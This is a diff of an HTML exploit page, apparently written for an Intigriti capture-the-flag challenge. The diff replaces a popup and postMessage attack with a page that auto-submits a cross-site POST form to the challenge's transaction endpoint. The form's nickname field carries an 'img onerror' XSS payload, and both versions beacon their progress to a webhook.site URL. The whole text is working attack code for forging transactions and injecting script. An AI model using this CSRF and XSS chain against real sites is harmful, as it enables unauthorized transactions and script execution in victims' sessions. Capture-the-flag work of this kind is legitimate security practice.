@@ -1,46 +1,20 @@
 <!DOCTYPE html>
-<html><head><title>Popup Exploit</title></head>
+<html><head><title>Form Exploit</title></head>
 <body>
-<h2>Exploit</h2>
-<pre id=log></pre>
+<h2>Submitting transaction...</h2>
+<form id="f" method="POST" action="https://challenge-0126.intigriti.io/api/transaction">
+    <input name="toAddress" value="16472226db03703a192aa383237035a69f">
+    <input name="currency" value="1337COIN">
+    <input name="amount" value="1">
+    <input name="nickname" value="<img src=x onerror='alert(&quot;gigawatz&quot;)'>">
+</form>
 <script>
-const WEBHOOK = 'https://webhook.site/8b2e60bf-f559-4793-afac-5a501921e9b4';
-const WALLET = '16472226db03703a192aa383237035a69f';
-const log = document.getElementById('log');
+const WEBHOOK = 'https://webhook.site/29343f11-0f99-4e28-b761-c1fff1028f35';
+fetch(WEBHOOK + '?s=FORM_SUBMIT').catch(()=>{});
 
-function report(step, data) {
-    log.textContent += '\n' + step;
-    fetch(WEBHOOK + '?s=' + step).catch(()=>{});
-}
-
-report('1_LOADED');
-
+// Auto-submit form
 setTimeout(function() {
-    report('2_OPENING_CHECKOUT');
-    
-    const win = window.open('https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1', '_blank');
-    
-    if (win) {
-        report('3_WINDOW_OPENED');
-        
-        setTimeout(function() {
-            report('4_SENDING_POSTMESSAGE');
-            
-            win.postMessage({
-                type: 'submitTransaction',
-                transaction: {
-                    toAddress: WALLET,
-                    currency: '1337COIN',
-                    amount: 1,
-                    nickname: '<img src=x onerror="alert(\'gigawatz\')">'
-                }
-            }, 'https://challenge-0126.intigriti.io');
-            
-            report('5_POSTMESSAGE_SENT');
-        }, 3000);
-    } else {
-        report('3_WINDOW_BLOCKED');
-    }
+    document.getElementById('f').submit();
 }, 500);
 </script>
 </body>
